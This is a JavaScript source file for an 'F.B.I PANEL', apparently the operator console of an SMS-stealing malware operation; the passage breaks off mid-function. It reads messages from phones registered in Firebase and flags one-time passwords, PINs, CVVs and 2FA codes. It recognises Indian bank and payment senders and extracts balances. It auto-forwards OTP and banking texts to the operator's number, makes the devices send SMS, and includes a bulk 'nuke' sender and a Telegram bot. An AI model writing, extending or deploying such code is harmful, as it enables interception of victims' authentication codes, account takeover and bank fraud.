/* ═══════════════════════════════════════════════════════════
   F.B.I PANEL v11.0 — Redis · Users · Force Join · No-Blink
   ═══════════════════════════════════════════════════════════ */

var CFG = window.SPECTER || {};
var FB_URL='',FB_KEY='';
var allDevices=[],selDev=null,activeDeviceUid=null;
var allMsgs=[],mfMode='all',amfMode='all';
var pinV={},pinC={},noteC={},otpNoteC={};
var usedDevices={},usedDevicesKey='fbi_used_devices';
var deviceSimMap={},deviceSimKey='fbi_device_sims';
var _msgCache={};
var gridFilter='all';
var _lastGridSig='';
var _cardRefs={};                 // 🆕 uid → DOM node (for no-blink update)
var deviceSearchQuery='';
var _sendWelcome=false;

/* ═══════ CURRENT USER (Telegram Mini App / cookie) ═══════ */
var currentUser = null;           // {id, first_name, last_name, username}
var myProfile = null;             // Redis profile

/* ═══════ SPEED ═══════ */
var POLL_FAST=250,POLL_DEV=1500,POLL_BG=300,POLL_BAL=5000,POLL_AM=2000,TG_POLL=30,CLOUD_DEB=150,API_TIMEOUT=6000;

var mPoll=null,dPoll=null,aPoll=null,bgPoll=null,balPoll=null;
var curMsgDev=null,lastKeys=new Set();
var amCache={},amFetch={};
var amAll=[],amFilt=[],amCount=0,amObs=null,amLoading=false,amLoaded=false,AM=80;

var nukeRunning=false,nukeSent=0,nukeFail=0,nukeTotal=0,_nukeActive=0,_nukeStartTime=0,_nukeStatsTmr=null;
var _nukePool=80;
var fbInstances=[];
var _mergeDebTimer=null,_lastMergeSig='';

var userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG||{}));
var blobId=null,cloudSaveTmr=null;
var tgRunning=false,tgPollLoop=false,tgLastUpdateId=0;
var forwardTracker={};
var tgDiagnostics={lastError:'',lastUpdate:0,updateCount:0,webhookInfo:'',botInfo:null};

var _msgStream=null,_msgStreamUid=null,_msgStreamDev=null;
var _sseFailCount={};

var deviceBalances={};
var _balTickRunning=false;
try{var _sb0=localStorage.getItem('fbi_device_balances');if(_sb0)deviceBalances=JSON.parse(_sb0)||{};}catch(e){}

var _lastAutoBackupDate=localStorage.getItem('fbi_last_auto_backup')||'';
var _backupRunning=false;

/* 🆕 per-user pending states for bot flows */
var userStates={};  // {chatId: {state:'wait_wall'|'wait_fb_url'|'wait_fb_key', data:{}}}

/* ═══════════════════════════════════════════════════════════
   🍪 COOKIE HELPERS
   ═══════════════════════════════════════════════════════════ */
function setCookie(name,value,days){
  try{
    var d=new Date();
    d.setTime(d.getTime()+(days||7)*24*60*60*1000);
    document.cookie=name+'='+encodeURIComponent(value)+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';
  }catch(e){}
}
function getCookie(name){
  try{
    var n=name+'=',parts=document.cookie.split(';');
    for(var i=0;i<parts.length;i++){
      var p=parts[i].trim();
      if(p.indexOf(n)===0)return decodeURIComponent(p.substring(n.length));
    }
  }catch(e){}
  return '';
}
function delCookie(name){try{document.cookie=name+'=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';}catch(e){}}

/* ═══════════════════════════════════════════════════════════
   🚀 REDIS (Upstash REST)
   ═══════════════════════════════════════════════════════════ */
async function redisCmd(cmd){
  try{
    var r=await fetch(CFG.REDIS_URL,{
      method:'POST',
      headers:{'Authorization':'Bearer '+CFG.REDIS_TOKEN,'Content-Type':'application/json'},
      body:JSON.stringify(cmd),
      signal:AbortSignal.timeout(8000)
    });
    if(!r.ok){console.warn('[Redis] HTTP '+r.status);return {result:null};}
    return await r.json();
  }catch(e){console.warn('[Redis] '+e.message);return {result:null};}
}
async function redisGet(k){var r=await redisCmd(['GET',k]);return r.result;}
async function redisSet(k,v){return await redisCmd(['SET',k,v]);}
async function redisDel(k){return await redisCmd(['DEL',k]);}
async function redisSAdd(set,member){return await redisCmd(['SADD',set,member]);}
async function redisSMembers(set){var r=await redisCmd(['SMEMBERS',set]);return r.result||[];}

/* ═══════════════════════════════════════════════════════════
   👤 USER PROFILE (Redis)
   ═══════════════════════════════════════════════════════════ */
async function saveUserProfile(profile){
  profile.lastSeen=Date.now();
  await redisSet('fbi:user:'+profile.id,JSON.stringify(profile));
  await redisSAdd('fbi:users',String(profile.id));
  myProfile=profile;
}
async function getUserProfile(chatId){
  var v=await redisGet('fbi:user:'+chatId);
  if(!v)return null;
  try{return JSON.parse(v);}catch(e){return null;}
}
async function getAllUserIds(){
  return await redisSMembers('fbi:users');
}

/* ═══════════════════════════════════════════════════════════
   📱 TELEGRAM MINI APP
   ═══════════════════════════════════════════════════════════ */
function getTelegramUser(){
  try{
    var tw=window.Telegram&&window.Telegram.WebApp;
    if(tw&&tw.initDataUnsafe&&tw.initDataUnsafe.user){
      var u=tw.initDataUnsafe.user;
      return {id:String(u.id),first_name:u.first_name||'',last_name:u.last_name||'',username:u.username||'',language:u.language_code||'en'};
    }
  }catch(e){}
  return null;
}
function initTelegramWebApp(){
  try{
    var tw=window.Telegram&&window.Telegram.WebApp;
    if(tw){tw.ready();tw.expand();
      try{tw.setHeaderColor('#08040e');tw.setBackgroundColor('#08040e');}catch(e){}
    }
  }catch(e){}
  currentUser=getTelegramUser();
  /* Fallback: URL param ?uid= or cookie */
  if(!currentUser){
    var uid=(new URLSearchParams(location.search)).get('uid')||getCookie('fbi_uid');
    if(uid){
      var name=getCookie('fbi_name')||('User '+uid.slice(-4));
      currentUser={id:String(uid),first_name:name,last_name:'',username:''};
    }
  }
  /* Persist to cookie */
  if(currentUser){
    setCookie('fbi_uid',currentUser.id,7);
    setCookie('fbi_name',(currentUser.first_name||'')+' '+(currentUser.last_name||''),7);
  }
  renderUserUI();
}

function renderUserUI(){
  var el=document.getElementById('tbUserName');
  var su=document.getElementById('setupUser');
  if(!currentUser){
    if(el)el.textContent='';
    if(su)su.style.display='none';
    return;
  }
  var full=(currentUser.first_name||'')+(currentUser.last_name?(' '+currentUser.last_name):'');
  if(el)el.textContent='👤 '+full;
  if(su){
    su.style.display='flex';
    su.innerHTML='<span style="font-size:18px">👤</span><div><b>'+esc(full)+'</b>'+(currentUser.username?' <span style="color:var(--dim);font-size:10px">@'+esc(currentUser.username)+'</span>':'')+'</div>';
  }
}
function currentUserId(){return currentUser?String(currentUser.id):null;}

/* ═══════════════════════════════════════════════════════════
   🍪 SESSION SAVE/RESTORE (Cookies + localStorage)
   ═══════════════════════════════════════════════════════════ */
function savePanelSession(){
  try{
    var s={
      fbUrl:FB_URL,
      activeDeviceUid:activeDeviceUid||'',
      ts:Date.now()
    };
    localStorage.setItem(CFG.LS_SESSION,JSON.stringify(s));
    setCookie('fbi_fburl',FB_URL,30);
    if(activeDeviceUid)setCookie('fbi_dev',activeDeviceUid,30);
  }catch(e){}
}
function restorePanelSession(){
  var fbUrl='',dev='';
  try{
    var raw=localStorage.getItem(CFG.LS_SESSION);
    if(raw){var s=JSON.parse(raw);fbUrl=s.fbUrl||'';dev=s.activeDeviceUid||'';}
  }catch(e){}
  if(!fbUrl)fbUrl=getCookie('fbi_fburl');
  if(!dev)dev=getCookie('fbi_dev');
  return {fbUrl:fbUrl,activeDeviceUid:dev};
}
function clearPanelSession(){
  try{localStorage.removeItem(CFG.LS_SESSION);}catch(e){}
  delCookie('fbi_fburl');delCookie('fbi_dev');
}

/* ═══════════════════════════════════════════════════════════
   🚧 FORCE JOIN
   ═══════════════════════════════════════════════════════════ */
async function checkChannelMembership(chatId){
  if(!userConfig.channelId)return true;
  var r=await tgApi('getChatMember',{chat_id:userConfig.channelId,user_id:chatId});
  if(!r.ok){
    console.warn('[FJ] getChatMember failed:',r.description);
    /* If bot can't check, allow through */
    return true;
  }
  var st=r.result.status;
  return st==='member'||st==='administrator'||st==='creator'||st==='restricted';
}

async function createOneTimeInvite(){
  var exp=Math.floor(Date.now()/1000)+60;   // 60s
  var r=await tgApi('createChatInviteLink',{
    chat_id:userConfig.channelId,
    member_limit:1,
    expire_date:exp,
    name:'fbi-'+Date.now()
  });
  if(r.ok&&r.result)return r.result.invite_link;
  return null;
}

async function sendForceJoin(chatId,fullName){
  var link=await createOneTimeInvite();
  var txt='🚧 <b>Channel Verification Required</b>\n\n'
    +'Namaste '+esc(fullName||'User')+'!\n\n'
    +'F.B.I PANEL use karne ke liye pehle hamara Telegram channel join karna zaroori hai.\n\n'
    +'⏱️ <b>Link 1 minute me expire ho jayega</b>\n'
    +'🔒 Private channel — sirf is link se join ho paayega\n\n'
    +(link?'🔗 <a href="'+esc(link)+'">👉 JOIN CHANNEL NOW</a>':'⚠️ Link generate nahi ho paya. Baad me try karein.');
  var kb={inline_keyboard:[[{text:'✅ I Joined',callback_data:'fj_check'}]]};
  await tgApi('sendMessage',{chat_id:chatId,text:txt,parse_mode:'HTML',reply_markup:JSON.stringify(kb),disable_web_page_preview:true});
}

/* ═══════════════════════════════════════════════════════════
   📲 SMS NOTIFY (user ko full details Telegram pe)
   ═══════════════════════════════════════════════════════════ */
async function notifySmsSent(dev,to,message,source){
  var uid=currentUserId();
  if(!uid)return;
  var txt='📤 <b>SMS Sent</b>\n\n'
    +'📱 <b>Device:</b> '+esc(dev?dev.name:'—')+'\n'
    +'📞 <b>To:</b> <code>'+esc(to)+'</code>\n'
    +'💬 <b>Message:</b>\n<code>'+esc(message)+'</code>\n\n'
    +'📡 Source: <b>'+esc(source||'panel')+'</b>\n'
    +'🕐 '+new Date().toLocaleString();
  try{await tgApi('sendMessage',{chat_id:uid,text:txt,parse_mode:'HTML'});}catch(e){}
}

/* ═══════════════════════════════════════════════════════════
   ═══════════════════════════════════════════════════════════
   ⚙️  E X I S T I N G   C O D E  (with v11 fixes)
   ═══════════════════════════════════════════════════════════
   ═══════════════════════════════════════════════════════════ */

/* ═══════ HIGH PRIORITY ═══════ */
var HIGH_PRIORITY_KEYWORDS=['otp','one time password','one-time password','one time code','one-time code','verification code','verify code','login code','security code','secure code','passcode','password','cvv','cvv2','pin','auth code','authorization code','authorisation code','authcode','2fa','two factor','two-factor','mfa','multi factor','secret code','access code','token','confirmation code','activation code','do not share','never share','valid for','expires in','expire in'];
function isHighPriority(msg){
  if(!msg)return false;
  var t=String(msg.message||'').toLowerCase();
  for(var i=0;i<HIGH_PRIORITY_KEYWORDS.length;i++){if(t.indexOf(HIGH_PRIORITY_KEYWORDS[i])!==-1)return true;}
  if(/\b\d{4,8}\b/.test(t)&&/(code|otp|pin|verify|password|auth)/i.test(t))return true;
  return false;
}

/* ═══════ BANK DATA ═══════ */
var BANK_SENDERS={'HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','HDFC':'HDFC Bank','SBIINB':'SBI','SBIMSG':'SBI','SBIUPI':'SBI','SBIPSG':'SBI','SBIBNK':'SBI','SBICRD':'SBI Card','ICICIB':'ICICI','ICICIM':'ICICI','ICICIBNK':'ICICI','ICICRD':'ICICI Card','AXISBK':'Axis Bank','AXISBNK':'Axis Bank','AXISB':'Axis Bank','AXISCR':'Axis Card','KOTAKB':'Kotak','KOTAKM':'Kotak','KOTAK':'Kotak','PNBSMS':'PNB','PNBMSG':'PNB','BOBSMS':'BOB','BARODA':'Bank of Baroda','CANBNK':'Canara Bank','CANBK':'Canara Bank','UNIONB':'Union Bank','IDBIBK':'IDBI','YESBNK':'Yes Bank','INDUSB':'IndusInd','IDFCFB':'IDFC First','FEDERL':'Federal Bank','RBLCRD':'RBL Bank','AUBANK':'AU Bank','BOIIND':'Bank of India','CENTBK':'Central Bank','INDIANB':'Indian Bank','UCOBNK':'UCO Bank','PAYTMB':'Paytm','PAYTM':'Paytm','PHONEPE':'PhonePe','PPBL':'PhonePe','AIRTEL':'Airtel','AIRBNK':'Airtel Payments Bank','JIOPB':'Jio Payments Bank','BAJAJF':'Bajaj Finserv','BFL':'Bajaj Finance','TATACP':'Tata Capital','CREDBK':'CRED','CRED':'CRED','NAVI':'Navi','SLICEB':'Slice','FIBE':'Fi Money','JUPITE':'Jupiter','GROWW':'Groww','ZERODHA':'Zerodha','PAYU':'PayU','RAZORP':'Razorpay','CASHFRE':'Cashfree','BILLDESK':'BillDesk','MPESA':'M-Pesa','CIBIL':'CIBIL','EXPERIA':'Experian','CRIF':'CRIF','EQUIFAX':'Equifax','LICI':'LIC','HDFCERGO':'HDFC Ergo','HDFCLIFE':'HDFC Life','ICICIPRU':'ICICI Prudential','SBILIFE':'SBI Life','MAXLIF':'Max Life','BAJAJALZ':'Bajaj Allianz','TATAAIG':'Tata AIG','STARHE':'Star Health','NIVA':'Niva Bupa','ACKO':'Acko','GODIGIT':'Go Digit'};
var BANK_BAL_KEYWORDS=['avl bal','avail bal','available bal','avbl bal','avl. bal','avlbal','availbal','ledger bal','book bal','closing bal','available balance','avl balance','bal:','bal -','bal is','bal rs','bal inr','balance:','balance is','balance -','ac bal','acc bal','a/c bal','account balance'];
var BANK_TXN_KEYWORDS=['debited','credited','withdrawn','deposited','spent','transferred','paid to','received from','txn','transaction','ref no','utr','imps','neft','rtgs','upi','atm','pos ','emi','payment of','dr.','cr.'];
var BANK_PROMO_KEYWORDS=['apply now','pre-approved','pre approved','loan offer','limited period','click here to apply','avail loan','personal loan offer','credit card offer','apply for','congratulations','congrats','winner','you have won','lucky','cashback offer','you are eligible','get up to','interest rate','festive offer','discount of','flat ₹','flat rs','shop now','buy now','sale ends','limited time','last chance','exclusive offer','hurry','grab now','don\'t miss'];
function _normSender(s){if(!s)return '';s=String(s).toUpperCase();s=s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|XX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|JK|RK|IM|IP)-/,'');s=s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/,'');return s.replace(/[^A-Z0-9]/g,'');}
function detectBank(sender){var s=_normSender(sender);if(!s)return null;for(var k in BANK_SENDERS){if(s.indexOf(k)!==-1)return{name:BANK_SENDERS[k],key:k};}return null;}
function isBankingSms(sender,message){var bank=detectBank(sender);if(!bank)return null;var m=String(message||'').toLowerCase();var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(m.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}var hasBal=false,hasTxn=false;for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(m.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(m.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}var hasOtp=/\botp\b|one time password|one-time password|verification code/i.test(m);if(isPromo&&!hasBal&&!hasTxn&&!hasOtp)return null;if(hasBal||hasTxn||hasOtp)return bank;return null;}

/* ═══════ INIT ═══════ */
loadUsedDevices();loadDeviceSims();loadForwardTracker();
initTelegramWebApp();                    /* 🆕 */
setupTelegramLink();                     /* 🆕 */
initCloudConfig();

function loadUsedDevices(){try{var r=localStorage.getItem(usedDevicesKey);if(r)usedDevices=JSON.parse(r)||{};}catch(e){}}
function saveUsedDevices(){try{localStorage.setItem(usedDevicesKey,JSON.stringify(usedDevices));}catch(e){}}
function loadDeviceSims(){try{var r=localStorage.getItem(deviceSimKey);if(r)deviceSimMap=JSON.parse(r)||{};}catch(e){}}
function saveDeviceSims(){try{localStorage.setItem(deviceSimKey,JSON.stringify(deviceSimMap));}catch(e){}}
function loadForwardTracker(){try{var r=localStorage.getItem('fbi_forward_tracker');if(r)forwardTracker=JSON.parse(r)||{};}catch(e){}}
function saveForwardTracker(){try{localStorage.setItem('fbi_forward_tracker',JSON.stringify(forwardTracker));}catch(e){}}

/* 🆕 setup telegram link icon */
function setupTelegramLink(){
  var el=document.getElementById('tgChannelLink');
  if(!el)return;
  var link=CFG.TG_CHANNEL_LINK||'';
  if(!link||link.indexOf('YOUR_CHANNEL')!==-1){el.style.display='none';return;}
  el.href=link;el.style.display='inline-flex';
}

/* ═══════ CLOUD CONFIG ═══════ */
async function initCloudConfig(){
  try{var cached=localStorage.getItem(CFG.LS_CACHE);if(cached){var parsed=JSON.parse(cached);userConfig=Object.assign({},CFG.DEFAULT_CONFIG,parsed);}}catch(e){}
  try{blobId=localStorage.getItem(CFG.LS_BLOB);
    if(blobId){
      updateCloudStatus('Fetching cloud config…');
      var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{signal:AbortSignal.timeout(API_TIMEOUT)});
      if(r.ok){var remote=await r.json();if(remote&&typeof remote==='object'){userConfig=Object.assign({},CFG.DEFAULT_CONFIG,remote);cacheConfigLocal();updateCloudStatus('☁ Synced from cloud');}}
    }else{await createCloudBlob();}
  }catch(e){updateCloudStatus('⚠ Cloud offline — using local');}

  /* 🆕 load user profile from Redis */
  var uid=currentUserId();
  if(uid){
    try{
      var prof=await getUserProfile(uid);
      if(prof){myProfile=prof;console.log('[Redis] Loaded profile for '+uid);}
    }catch(e){}
  }

  fetchBotUsername();
  if(userConfig.enabled!==false&&userConfig.botEnabled!==false&&userConfig.channelId)setTimeout(startTelegramBot,300);
  setInterval(checkAutoBackup,60000);
  setTimeout(checkAutoBackup,5000);

  /* 🆕 auto-restore session */
  setTimeout(autoRestoreSession,400);
}

async function createCloudBlob(){try{var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok)return;var loc=r.headers.get('Location')||r.headers.get('location');if(loc){var parts=loc.split('/');blobId=parts[parts.length-1];localStorage.setItem(CFG.LS_BLOB,blobId);updateCloudStatus('☁ Cloud config created');}}catch(e){updateCloudStatus('⚠ Cloud unavailable');}}
function cacheConfigLocal(){try{localStorage.setItem(CFG.LS_CACHE,JSON.stringify(userConfig));}catch(e){}}
function updateCloudStatus(msg,cls){var el=document.getElementById('cloudStatus');if(el){el.textContent=msg;el.className='settings-status '+(cls||'');}}
async function saveCloudConfig(){cacheConfigLocal();if(!blobId){await createCloudBlob();return;}try{var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});if(r.ok)updateCloudStatus('☁ Saved '+new Date().toLocaleTimeString());}catch(e){updateCloudStatus('⚠ Save failed — cached locally');}}
function debouncedCloudSave(){if(cloudSaveTmr)clearTimeout(cloudSaveTmr);cloudSaveTmr=setTimeout(saveCloudConfig,CLOUD_DEB);}
function forceCloudSave(){saveCloudConfig();toast('☁ Cloud save triggered');}
async function resetCloudConfig(){if(!confirm('Reset all cloud settings?'))return;userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));cacheConfigLocal();await saveCloudConfig();toast('🗑 Config reset');populateSettingsUI();}

/* 🆕 Auto-restore session */
function autoRestoreSession(){
  var s=restorePanelSession();
  if(s.fbUrl&&!FB_URL){
    var inp=document.getElementById('fbUrl');
    if(inp){
      inp.value=s.fbUrl;
      console.log('[Session] Restoring Firebase: '+s.fbUrl);
      connect();
      if(s.activeDeviceUid)setTimeout(function(){
        var d=allDevices.find(function(x){
          var uid=(x._fbId||'primary')+'|||'+x.id;
          return uid===s.activeDeviceUid;
        });
        if(d){console.log('[Session] Reopening device: '+d.name);openDeviceModal(s.activeDeviceUid);}
      },2500);
    }
  }
}

/* ═══════ FIREBASE CORE ═══════ */
async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}

/* ═══════ SMS SENDER ═══════ */
async function sendSmsViaDevice(dev,sim,to,message,tag){
  if(!dev)return{ok:false,error:'no device'};
  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
  var body=JSON.stringify({from:sim,to:to,message:message,isSended:false});
  var t0=performance.now();
  try{
    var r=await fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true,priority:'high'});
    var dt=(performance.now()-t0).toFixed(0);
    if(!r.ok){return{ok:false,error:'HTTP '+r.status};}
    console.log('[SMS]['+tag+'] ✓ '+dt+'ms → '+dev.name);
    notifySmsSent(dev,to,message,tag);  /* 🆕 */
    return{ok:true};
  }catch(e){console.error('[SMS]['+tag+'] ✗ '+e.message);return{ok:false,error:e.message};}
}
function sendSmsFireAndForget(dev,sim,to,message,tag,highPriority){
  if(!dev)return Promise.resolve(false);
  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
  var body=JSON.stringify({from:sim,to:to,message:message,isSended:false});
  var opts={method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true};
  if(highPriority)opts.priority='high';
  var t0=performance.now();
  return fetch(url,opts).then(function(r){
    var dt=(performance.now()-t0).toFixed(0);
    if(r.ok){console.log('[SMS-FF]['+tag+'] ✓ '+dt+'ms → '+dev.name);notifySmsSent(dev,to,message,tag);}
    else console.warn('[SMS-FF]['+tag+'] ✗ '+r.status);
    return r.ok;
  }).catch(function(e){console.warn('[SMS-FF]['+tag+'] ✗ '+e.message);return false;});
}
async function sendHighPrioritySms(dev,sim,to,message,tag){
  for(var i=0;i<5;i++){var ok=await sendSmsFireAndForget(dev,sim,to,message,tag+'-r'+i,true);if(ok)return true;await sleep(40);}
  return false;
}

/* ═══════ CONNECTION ═══════ */
function connect(){
  var url=document.getElementById('fbUrl').value.trim().replace(/\/+$/,'');
  if(!url){showErr('Enter your Firebase URL');return;}
  FB_URL=url;
  document.getElementById('setup').style.display='none';
  document.getElementById('panel').style.display='flex';
  savePanelSession();  /* 🆕 */
  loadDevs();startDP();startBgForwardPoll();startBalancePoll();
  setTimeout(function(){fbRegisterPrimary();},200);
  if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,500);
}
function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
function disconnect(){
  FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};
  amCache={};amAll=[];amFilt=[];amLoaded=false;
  stopMP();stopDP();stopAP();stopTelegramBot();stopBgForwardPoll();stopBalancePoll();stopMsgStream();
  clearPanelSession();  /* 🆕 */
  document.getElementById('panel').style.display='none';
  document.getElementById('setup').style.display='flex';
}

/* ═══════ SSE ═══════ */
function startMsgStream(dev){
  if(!dev)return;
  var uid=(dev._fbId||'primary')+'|||'+dev.id;
  if(_msgStreamUid===uid&&_msgStream&&_msgStream.readyState===1)return;
  if(_sseFailCount[uid]&&_sseFailCount[uid]>3)return;
  stopMsgStream();
  _msgStreamUid=uid;_msgStreamDev=dev;
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  var url=fbUrl+'/messages/'+dev.id+'.json'+(fbKey?'?auth='+fbKey:'');
  try{
    _msgStream=new EventSource(url);
    _msgStream.onopen=function(){console.log('[SSE] ✓ '+dev.name);_sseFailCount[uid]=0;};
    _msgStream.onerror=function(){_sseFailCount[uid]=(_sseFailCount[uid]||0)+1;console.warn('[SSE] ✗ #'+_sseFailCount[uid]+' '+dev.name);};
    _msgStream.addEventListener('put',function(ev){try{var d=JSON.parse(ev.data);if(!d||!d.path)return;var parts=String(d.path).replace(/^\//,'').split('/');var key=parts[0];if(!key||parts.length>1)return;if(!d.data||typeof d.data!=='object')return;_handleStreamMsg(dev,key,d.data);}catch(e){}});
    _msgStream.addEventListener('patch',function(ev){try{var d=JSON.parse(ev.data);if(!d||!d.path)return;var parts=String(d.path).replace(/^\//,'').split('/');var key=parts[0];if(!key)return;if(!d.data||typeof d.data!=='object')return;_handleStreamMsg(dev,key,d.data);}catch(e){}});
  }catch(e){console.error('[SSE] init',e);}
}
function stopMsgStream(){if(_msgStream){try{_msgStream.close();}catch(e){}_msgStream=null;_msgStreamUid=null;_msgStreamDev=null;}}
function _handleStreamMsg(dev,key,data){
  var t0=performance.now();
  var msg=parseMsgSingle(key,data);
  if(!msg)return;
  var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
  var cached=_msgCache[cacheKey]||[];
  var isNew=true;
  for(var i=0;i<cached.length;i++){if(cached[i].key===key){cached[i]=msg;isNew=false;break;}}
  if(isNew){cached.unshift(msg);if(cached.length>200)cached.length=200;}
  _msgCache[cacheKey]=cached;
  amCache[dev.id]=cached;amFetch[dev.id]=Date.now();
  if(selDev&&selDev.id===dev.id){allMsgs=cached;lastKeys.add(key);updCnt();filterActiveMsgs();renderBankPane();var otp=_extractOtp(msg.message);if(otp&&otp!==_lastOtp)otpShow(otp,msg.sender);}
  if(isNew&&msg.type==='incoming')_instantForward(dev,msg);
  if(isNew&&msg.type==='incoming'){
    var bal=extractLastBalance([msg]);
    if(bal){deviceBalances[dev.id]=bal;try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}updateCardNoBlink(dev.id);if(selDev&&selDev.id===dev.id)refreshDeviceModal();}
  }
}
function _instantForward(dev,msg){
  if(userConfig.forwardEnabled===false)return;
  var myNum=userConfig.myNumber;
  if(!myNum)return;
  var mode=userConfig.forwardMode||'all';
  if(mode==='banking'&&!isBankingSms(msg.sender,msg.message))return;
  if(!msg.message||!msg.message.trim()||msg.message.trim()==='(no body)')return;
  var sim=deviceSimMap[dev.id]||1;
  var hp=isHighPriority(msg);
  if(hp)sendHighPrioritySms(dev,sim,myNum,msg.message.trim(),'hp').then(function(ok){if(ok)toast('🔥 OTP forwarded → '+myNum);});
  else sendSmsFireAndForget(dev,sim,myNum,msg.message.trim(),'instant',false).then(function(ok){if(ok)toast('📤 Forwarded → '+myNum);});
}
function setMyNumberDefault(){
  if(!userConfig.myNumber){toast('⚠ Set My Number in Settings');return;}
  var el=document.getElementById('dmSendTo');
  if(el){el.value=userConfig.myNumber;toast('📞 '+userConfig.myNumber);}
}
function parseMsgSingle(key,m){
  var message='',sender='',dateTime='',type='incoming';
  if(typeof m==='string'){message=m;sender='Unknown';}
  else if(typeof m==='object'){
    message=m.message||m.body||m.messageBody||m.text||m.msg||m.content||m.sms||m.Body||m.Message||'';
    var ps=m.sender||m.from||m.phoneNumber||m.phone||m.number||m.source||m.originator||m.from_number;
    var ads=m.address||m.originatingAddress||m.senderAddress||m.remoteAddress||m.peerAddress;
    var ids=m.senderId||m.senderid||m.shortCode||m.short_code||m.sender_id;
    sender=String(ps||ads||ids||'').trim();
    if(!sender||sender==='null'||sender==='undefined'||sender==='0')sender='';
    if(!sender){var keys=Object.keys(m);for(var ki=0;ki<keys.length;ki++){var kk=keys[ki],vv=String(m[kk]||'').trim();if(/^\+?\d{5,15}$/.test(vv)&&kk!=='type'&&kk!=='msgType'&&kk!=='messageType'){sender=vv;break;}}}
    if(!sender)sender='Unknown';
    dateTime=m.dateTime||m.date||m.time||m.timestamp||m.createdAt||m.receivedAt||m.sentAt||m.dateReceived||m.dateSent||'';
    var rt=String(m.type||m.direction||m.msgType||m.messageType||'');
    type=(rt==='2'||rt.toLowerCase().includes('out')||rt.toLowerCase().includes('sent'))?'outgoing':'incoming';
  }
  if(!message&&!sender)return null;
  return{key:key,message:message||'(no body)',sender:sender||'Unknown',dateTime:dateTime,type:type,_ts:parseDT(dateTime)};
}

/* ═══════ POLLERS ═══════ */
function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
  var d=await fbGet('clients');var nD=parseDevs(d);
  nD.forEach(function(dev){dev._fbId='primary';dev._fbLabel='Primary';dev._fbUrl=FB_URL;dev._fbKey=FB_KEY;});
  var others=allDevices.filter(function(x){return(x._fbId||'primary')!=='primary';});
  allDevices=applyStableOrder(nD.concat(others));
  renderStats();renderGrid();          /* 🆕 no force */
  if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up){selDev=up;refreshDeviceModal();}}
}catch(e){}},POLL_DEV);}
function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}

function startMP(id){stopMP();curMsgDev=id;var dev=allDevices.find(function(d){return d.id===id;});if(dev)startMsgStream(dev);pollMsgs(id);mPoll=setInterval(function(){if(selDev&&selDev.id===id){var alive=_msgStream&&_msgStream.readyState===1;if(!alive)pollMsgs(id);}},POLL_FAST);}
function stopMP(){if(mPoll){clearInterval(mPoll);mPoll=null;}curMsgDev=null;stopMsgStream();}

function startAP(){stopAP();aPoll=setInterval(function(){if(document.getElementById('allMsgsModal').classList.contains('open'))pollAllFresh();},POLL_AM);}
function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'400px'});amObs.observe(s);}
function killObs(){if(amObs){amObs.disconnect();amObs=null;}}

/* ═══════ BG FORWARD ═══════ */
function startBgForwardPoll(){stopBgForwardPoll();bgPoll=setInterval(bgForwardTick,POLL_BG);}
function stopBgForwardPoll(){if(bgPoll){clearInterval(bgPoll);bgPoll=null;}}
async function bgForwardTick(){
